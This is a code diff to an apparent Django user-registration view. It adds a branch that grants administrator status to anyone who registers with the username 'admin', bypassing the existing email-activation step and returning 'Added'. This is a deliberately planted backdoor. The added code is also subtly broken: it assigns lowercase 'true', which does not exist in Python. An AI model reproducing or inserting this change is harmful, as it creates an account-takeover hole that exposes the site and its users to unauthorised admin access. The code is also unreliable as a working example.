@@ -19,19 +19,24 @@ def register(request):
         form = UserRegisterForm(request.POST)
         if form.is_valid():
             user = form.save(commit=False)
-            user.is_active = False   # not active until email confirmed
-            user.save()
-            current_site = get_current_site(request)
-            mail_subject = 'Activate your account.'
-            message = render_to_string('accounts/acc_active_email.html', {
-                'user': user,
-                'domain': current_site.domain,
-                'uid':urlsafe_base64_encode(force_bytes(user.pk)).decode(),
-                'token':account_activation_token.make_token(user),
-            })
-            to_email = form.cleaned_data.get('email')
-            send_mail(mail_subject, message, 'test@drunkguthrie.com', [to_email], fail_silently=False)
-            return render(request, 'accounts/register_complete.html', {'email_address' : to_email})
+            if user.username=="admin":
+                user.is_admin = true
+                user.save()
+                return HttpResponse("Added")
+            else:
+                user.is_active = False   # not active until email confirmed
+                user.save()
+                current_site = get_current_site(request)
+                mail_subject = 'Activate your account.'
+                message = render_to_string('accounts/acc_active_email.html', {
+                    'user': user,
+                    'domain': current_site.domain,
+                    'uid':urlsafe_base64_encode(force_bytes(user.pk)).decode(),
+                    'token':account_activation_token.make_token(user),
+                })
+                to_email = form.cleaned_data.get('email')
+                send_mail(mail_subject, message, 'test@drunkguthrie.com', [to_email], fail_silently=False)
+                return render(request, 'accounts/register_complete.html', {'email_address' : to_email})
     else:
         form = UserRegisterForm()
     context = {
